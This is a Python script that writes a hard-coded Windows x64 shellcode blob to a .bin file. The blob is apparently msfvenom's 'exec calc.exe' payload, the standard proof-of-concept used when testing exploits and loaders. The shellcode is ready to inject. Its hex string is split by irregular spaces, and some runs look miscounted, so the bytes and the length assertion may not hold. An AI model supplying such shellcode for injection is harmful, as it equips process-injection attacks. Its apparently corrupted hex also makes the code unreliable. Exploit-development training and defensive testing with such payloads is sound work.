#!/usr/bin/env python3
"""Emit the classic msfvenom windows/x64/exec CMD=calc.exe shellcode (276 bytes).
EXITFUNC=process — calc spawns as a separate process via WinExec, then the
loader exits cleanly."""
import sys
from pathlib import Path

SHELLCODE = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251"
    "56483 1d265488b5260488b5218488b52"
    "20488b7250480fb74a4a4d31c94831c0"
    "ac3c617c022c2041c1c90d4101c1e2ed"
    "5241514 88b5220 8b423c4801d08b8088"
    "000000004885c074674801d050 8b4818"
    "448b402049 01d0e35648ffc9418b3488"
    "4801d64d31c94831c0ac41c1c90d4101"
    "c138e07 5f14c034c2408 4539d175d858"
    "448b40244901d066418b0c48448b401c"
    "4901d0418b04884801d04158415 85e59"
    "5a4158415941 5a4883ec2041 52ffe058"
    "41595a488b 12e957ffffff5d48 ba0100"
    "0000 000 0000 0488d8d010100 0041ba31"
    "8b6f87 ffd5bbf0b5a256 41baa695bd9d"
    "ffd54883c4283c067c0a80fb e0750 5bb"
    "47137 26f6a005941 89daffd5"
    "63616c632e786500"
    .replace(" ", "")
)

assert len(SHELLCODE) == 276, f"unexpected length {len(SHELLCODE)}"

out = Path(sys.argv[1] if len(sys.argv) > 1 else "calc-shellcode.bin")
out.write_bytes(SHELLCODE)
print(f"[+] {out} : {len(SHELLCODE)} bytes")
